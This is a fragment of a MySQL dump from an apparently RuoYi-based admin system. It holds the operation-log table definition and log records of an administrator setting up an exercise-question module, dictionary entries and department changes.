INSERT INTO `sys_notice` (`notice_id`, `notice_title`, `notice_type`, `notice_content`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2, '维护通知：2018-07-01 若依系统凌晨维护', '1', 0xE7BBB4E68AA4E58685E5AEB9, '0', 'admin', '2023-10-23 20:57:31', '', NULL, '管理员');
COMMIT;

-- ----------------------------
-- Table structure for sys_oper_log
-- ----------------------------
DROP TABLE IF EXISTS `sys_oper_log`;
CREATE TABLE `sys_oper_log` (
  `oper_id` bigint NOT NULL AUTO_INCREMENT COMMENT '日志主键',
  `title` varchar(50) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '模块标题',
  `business_type` int DEFAULT '0' COMMENT '业务类型（0其它 1新增 2修改 3删除）',
  `method` varchar(100) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '方法名称',
  `request_method` varchar(10) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '请求方式',
  `operator_type` int DEFAULT '0' COMMENT '操作类别（0其它 1后台用户 2手机端用户）',
  `oper_name` varchar(50) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '操作人员',
  `dept_name` varchar(50) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '部门名称',
  `oper_url` varchar(255) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '请求URL',
  `oper_ip` varchar(128) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '主机地址',
  `oper_location` varchar(255) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '操作地点',
  `oper_param` varchar(2000) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '请求参数',
  `json_result` varchar(2000) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '返回参数',
  `status` int DEFAULT '0' COMMENT '操作状态（0正常 1异常）',
  `error_msg` varchar(2000) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '错误消息',
  `oper_time` datetime DEFAULT NULL COMMENT '操作时间',
  `cost_time` bigint DEFAULT '0' COMMENT '消耗时间',
  PRIMARY KEY (`oper_id`),
  KEY `idx_sys_oper_log_bt` (`business_type`),
  KEY `idx_sys_oper_log_s` (`status`),
  KEY `idx_sys_oper_log_ot` (`oper_time`)
) ENGINE=InnoDB AUTO_INCREMENT=522 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='操作日志记录';

-- ----------------------------
-- Records of sys_oper_log
-- ----------------------------
BEGIN;
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (100, '代码生成', 6, 'com.ruoyi.project.tool.gen.controller.GenController.importTableSave()', 'POST', 1, 'admin', NULL, '/tool/gen/importTable', '127.0.0.1', '内网IP', '{\"tables\":\"tb_exercises\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-24 09:20:25', 159);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (101, '字典类型', 1, 'com.ruoyi.project.system.controller.SysDictTypeController.add()', 'POST', 1, 'admin', NULL, '/system/dict/type', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"dictName\":\"题目类型\",\"dictType\":\"sys_exercise_type\",\"params\":{},\"remark\":\"题目类型字典值\",\"status\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-24 09:26:20', 85);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (102, '字典数据', 1, 'com.ruoyi.project.system.controller.SysDictDataController.add()', 'POST', 1, 'admin', NULL, '/system/dict/data', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"default\":false,\"dictLabel\":\"选择\",\"dictSort\":0,\"dictType\":\"sys_exercise_type\",\"dictValue\":\"0\",\"listClass\":\"default\",\"params\":{},\"status\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-24 09:27:10', 68);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (103, '字典数据', 1, 'com.ruoyi.project.system.controller.SysDictDataController.add()', 'POST', 1, 'admin', NULL, '/system/dict/data', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"default\":false,\"dictLabel\":\"判断\",\"dictSort\":0,\"dictType\":\"sys_exercise_type\",\"dictValue\":\"1\",\"listClass\":\"default\",\"params\":{},\"status\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-24 09:27:20', 81);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (104, '字典数据', 2, 'com.ruoyi.project.system.controller.SysDictDataController.edit()', 'PUT', 1, 'admin', NULL, '/system/dict/data', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:27:10\",\"default\":false,\"dictCode\":100,\"dictLabel\":\"选择\",\"dictSort\":1,\"dictType\":\"sys_exercise_type\",\"dictValue\":\"0\",\"isDefault\":\"N\",\"listClass\":\"default\",\"params\":{},\"status\":\"0\",\"updateBy\":\"admin\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-24 09:27:38', 78);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (105, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exercises\",\"className\":\"TbExercises\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":1,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"usableColumn\":false},{\"capJavaField\":\"ExerciseTitle\",\"columnComment\":\"题目描述\",\"columnId\":2,\"columnName\":\"exercise_title\",\"columnType\":\"text\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"textarea\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"exerciseTitle\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceA\",\"columnComment\":\"选项A\",\"columnId\":3,\"columnName\":\"choice_a\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"javaField\":\"choiceA\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceB\",\"columnComment\":\"选项B\",\"columnId\":4,\"columnName\":\"choice_b\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"javaField\":\"choiceB\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-24 09:28:45', 101);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (106, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exercises\",\"className\":\"TbExercises\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":1,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-24 09:28:45\",\"usableColumn\":false},{\"capJavaField\":\"ExerciseTitle\",\"columnComment\":\"题目描述\",\"columnId\":2,\"columnName\":\"exercise_title\",\"columnType\":\"text\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"textarea\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"exerciseTitle\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-24 09:28:45\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceA\",\"columnComment\":\"选项A\",\"columnId\":3,\"columnName\":\"choice_a\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"javaField\":\"choiceA\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-24 09:28:45\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceB\",\"columnComment\":\"选项B\",\"columnId\":4,\"columnName\":\"choice_b\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-24 09:28:54', 69);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (107, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/4', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"菜单已分配,不允许删除\",\"code\":601}', 0, NULL, '2023-10-24 09:30:58', 31);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (108, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exercises\",\"className\":\"Exercises\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":1,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-24 09:28:54\",\"usableColumn\":false},{\"capJavaField\":\"ExerciseTitle\",\"columnComment\":\"题目描述\",\"columnId\":2,\"columnName\":\"exercise_title\",\"columnType\":\"text\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"textarea\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"exerciseTitle\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-24 09:28:54\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceA\",\"columnComment\":\"选项A\",\"columnId\":3,\"columnName\":\"choice_a\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"javaField\":\"choiceA\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-24 09:28:54\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceB\",\"columnComment\":\"选项B\",\"columnId\":4,\"columnName\":\"choice_b\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"i', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-24 09:36:12', 59);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (109, '部门管理', 3, 'com.ruoyi.project.system.controller.SysDeptController.remove()', 'DELETE', 1, 'admin', NULL, '/system/dept/102', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"存在下级部门,不允许删除\",\"code\":601}', 0, NULL, '2023-10-24 09:58:10', 17);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (110, '部门管理', 3, 'com.ruoyi.project.system.controller.SysDeptController.remove()', 'DELETE', 1, 'admin', NULL, '/system/dept/108', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-24 09:58:13', 49);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (111, '部门管理', 3, 'com.ruoyi.project.system.controller.SysDeptController.remove()', 'DELETE', 1, 'admin', NULL, '/system/dept/109', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-24 09:58:17', 33);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (112, '部门管理', 3, 'com.ruoyi.project.system.controller.SysDeptController.remove()', 'DELETE', 1, 'admin', NULL, '/system/dept/102', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-24 09:58:19', 33);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (113, '部门管理', 3, 'com.ruoyi.project.system.controller.SysDeptController.remove()', 'DELETE', 1, 'admin', NULL, '/system/dept/107', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-24 09:58:22', 27);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (114, '部门管理', 3, 'com.ruoyi.project.system.controller.SysDeptController.remove()', 'DELETE', 1, 'admin', NULL, '/system/dept/106', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-24 09:58:24', 29);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (115, '部门管理', 3, 'com.ruoyi.project.system.controller.SysDeptController.remove()', 'DELETE', 1, 'admin', NULL, '/system/dept/105', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"部门存在用户,不允许删除\",\"code\":601}', 0, NULL, '2023-10-24 09:58:26', 12);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (116, '部门管理', 3, 'com.ruoyi.project.system.controller.SysDeptController.remove()', 'DELETE', 1, 'admin', NULL, '/system/dept/104', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-24 09:58:28', 36);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (117, '部门管理', 3, 'com.ruoyi.project.system.controller.SysDeptController.remove()', 'DELETE', 1, 'admin', NULL, '/system/dept/105', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"部门存在用户,不允许删除\",\"code\":601}', 0, NULL, '2023-10-24 09:58:30', 15);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (118, '部门管理', 3, 'com.ruoyi.project.system.controller.SysDeptController.remove()', 'DELETE', 1, 'admin', NULL, '/system/dept/103', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"部门存在用户,不允许删除\",\"code\":601}', 0, NULL, '2023-10-24 09:58:33', 23);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (119, '部门管理', 2, 'com.ruoyi.project.system.controller.SysDeptController.edit()', 'PUT', 1, 'admin', NULL, '/system/dept', '127.0.0.1', '内网IP', '{\"ancestors\":\"0\",\"children\":[],\"deptId\":100,\"deptName\":\"童辰科技\",\"email\":\"tckj@qq.com\",\"leader\":\"童辰\",\"orderNum\":0,\"params\":{},\"parentId\":0,\"phone\":\"15888888888\",\"status\":\"0\",\"updateBy\":\"admin\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-24 09:59:44', 33);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (120, '用户管理', 2, 'com.ruoyi.project.system.controller.SysUserController.edit()', 'PUT', 1, 'admin', NULL, '/system/user', '127.0.0.1', '内网IP', '{\"admin\":false,\"avatar\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-23 20:57:31\",\"delFlag\":\"0\",\"dept\":{\"ancestors\":\"0,100,101\",\"children\":[],\"deptId\":105,\"deptName\":\"测试部门\",\"leader\":\"若依\",\"orderNum\":3,\"params\":{},\"parentId\":101,\"status\":\"0\"},\"deptId\":100,\"email\":\"ry@qq.com\",\"loginDate\":\"2023-10-23 20:57:31\",\"loginIp\":\"127.0.0.1\",\"nickName\":\"若依\",\"params\":{},\"phonenumber\":\"15666666666\",\"postIds\":[2],\"remark\":\"测试员\",\"roleIds\":[2],\"roles\":[{\"admin\":false,\"dataScope\":\"2\",\"deptCheckStrictly\":false,\"flag\":false,\"menuCheckStrictly\":false,\"params\":{},\"roleId\":2,\"roleKey\":\"common\",\"roleName\":\"普通角色\",\"roleSort\":2,\"status\":\"0\"}],\"sex\":\"1\",\"status\":\"0\",\"updateBy\":\"admin\",\"userId\":2,\"userName\":\"ry\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-24 10:02:36', 50);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (121, '部门管理', 3, 'com.ruoyi.project.system.controller.SysDeptController.remove()', 'DELETE', 1, 'admin', NULL, '/system/dept/103', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-24 10:02:51', 27);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (122, '部门管理', 3, 'com.ruoyi.project.system.controller.SysDeptController.remove()', 'DELETE', 1, 'admin', NULL, '/system/dept/105', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-24 10:02:54', 27);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (123, '部门管理', 2, 'com.ruoyi.project.system.controller.SysDeptController.edit()', 'PUT', 1, 'admin', NULL, '/system/dept', '127.0.0.1', '内网IP', '{\"ancestors\":\"0,100\",\"children\":[],\"deptId\":101,\"deptName\":\"管理部门\",\"email\":\"ry@qq.com\",\"leader\":\"若依\",\"orderNum\":1,\"params\":{},\"parentId\":100,\"parentName\":\"童辰科技\",\"phone\":\"15888888888\",\"status\":\"0\",\"updateBy\":\"admin\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-24 10:03:26', 97);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (124, '部门管理', 1, 'com.ruoyi.project.system.controller.SysDeptController.add()', 'POST', 1, 'admin', NULL, '/system/dept', '127.0.0.1', '内网IP', '{\"ancestors\":\"0,100\",\"children\":[],\"createBy\":\"admin\",\"deptName\":\"用户\",\"leader\":\"高飞\",\"orderNum\":2,\"params\":{},\"parentId\":100,\"phone\":\"15888888888\",\"status\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-24 10:04:15', 38);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (125, '用户管理', 2, 'com.ruoyi.project.system.controller.SysUserController.edit()', 'PUT', 1, 'admin', NULL, '/system/user', '127.0.0.1', '内网IP', '{\"admin\":false,\"avatar\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-23 20:57:31\",\"delFlag\":\"0\",\"dept\":{\"ancestors\":\"0\",\"children\":[],\"deptId\":100,\"deptName\":\"童辰科技\",\"leader\":\"童辰\",\"orderNum\":0,\"params\":{},\"parentId\":0,\"status\":\"0\"},\"deptId\":101,\"email\":\"ry@qq.com\",\"loginDate\":\"2023-10-23 20:57:31\",\"loginIp\":\"127.0.0.1\",\"nickName\":\"若依\",\"params\":{},\"phonenumber\":\"15666666666\",\"postIds\":[],\"remark\":\"测试员\",\"roleIds\":[2],\"roles\":[{\"admin\":false,\"dataScope\":\"2\",\"deptCheckStrictly\":false,\"flag\":false,\"menuCheckStrictly\":false,\"params\":{},\"roleId\":2,\"roleKey\":\"common\",\"roleName\":\"普通角色\",\"roleSort\":2,\"status\":\"0\"}],\"sex\":\"1\",\"status\":\"0\",\"updateBy\":\"admin\",\"userId\":2,\"userName\":\"ry\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-24 10:05:28', 50);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (126, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.synchDb()', 'GET', 1, 'admin', NULL, '/tool/gen/synchDb/tb_exercises', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 08:53:45', 242);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (127, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.synchDb()', 'GET', 1, 'admin', NULL, '/tool/gen/synchDb/tb_exercises', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 08:54:47', 103);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (128, '字典类型', 1, 'com.ruoyi.project.system.controller.SysDictTypeController.add()', 'POST', 1, 'admin', NULL, '/system/dict/type', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"dictName\":\"题目分类\",\"dictType\":\"sys_exercise_cate\",\"params\":{},\"status\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 08:55:40', 77);
